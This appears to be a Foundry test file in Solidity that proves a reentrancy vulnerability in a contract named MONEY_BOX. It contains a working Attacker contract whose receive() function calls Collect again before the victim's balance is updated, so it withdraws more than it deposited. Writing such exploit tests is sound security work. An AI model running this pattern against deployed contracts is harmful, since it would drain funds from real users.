
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MONEY_BOX, Log} from "../src/MONEY_BOX.sol";

contract TestReentrancyMONEY_BOX is Test {
    MONEY_BOX public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new MONEY_BOX();
        
        _contractUnderTest.SetLogFile(address(_log));
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 0.1 ether && attackVal < 100 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // We set MinSum to 2x the attackVal.
        // This ensures that after the first withdrawal (1x), the remaining balance (1x) 
        // is LESS than MinSum (2x).
        // A secure contract would fail the second withdrawal.
        // The vulnerable contract allows it because balance isn't updated yet during reentrancy.
        uint256 minSum = attackVal * 2;
        uint256 depositAmount = minSum;

        _contractUnderTest.SetMinSum(minSum);
        _contractUnderTest.Initialized();

        // --- 3. Funding ---
        vm.deal(address(this), depositAmount);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: depositAmount}(attackVal);
        
        // Advance time to satisfy block.timestamp > unlockTime (Put sets unlockTime to block.timestamp + 0)
        vm.warp(block.timestamp + 10);
        
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MONEY_BOX public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public amountToWithdraw;

    constructor(address victimAddress) { 
        victim = MONEY_BOX(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        amountToWithdraw = val;
        
        // Deposit funds with 0 lock time
        victim.Put{value: msg.value}(0);
    }

    function attack(uint256 val) public {
        // Call the vulnerable function
        victim.Collect(val);

        // Verify Success Conditions
        // If we managed to call Collect twice successfully, attackCallCount will be incremented in receive
        if (attackCallCount >= 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.Collect(amountToWithdraw);
        }
    }
}
